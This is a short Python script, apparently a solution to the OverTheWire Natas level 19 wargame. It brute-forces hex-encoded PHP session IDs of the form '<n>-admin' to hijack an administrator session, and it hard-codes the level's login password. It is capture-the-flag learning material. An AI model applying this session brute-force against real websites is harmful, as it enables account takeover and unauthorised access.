import requests
import string

url = "http://natas19.natas.labs.overthewire.org/?"

user = "natas19"
passw = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

urlparams = "debug"
i = 0
payload = (str(i)+"-admin").encode("ascii").hex()
paylodict = {"PHPSESSID": payload}
resp = requests.get(url + urlparams, auth=(user, passw), cookies=paylodict)

while "regular user" in resp.text:
    i += 1
    payload = (str(i)+"-admin").encode("ascii").hex()
    print(i, payload)
    paylodict = {"PHPSESSID": payload}
    resp = requests.get(url + urlparams, auth=(user, passw), cookies=paylodict)

print(resp.text)
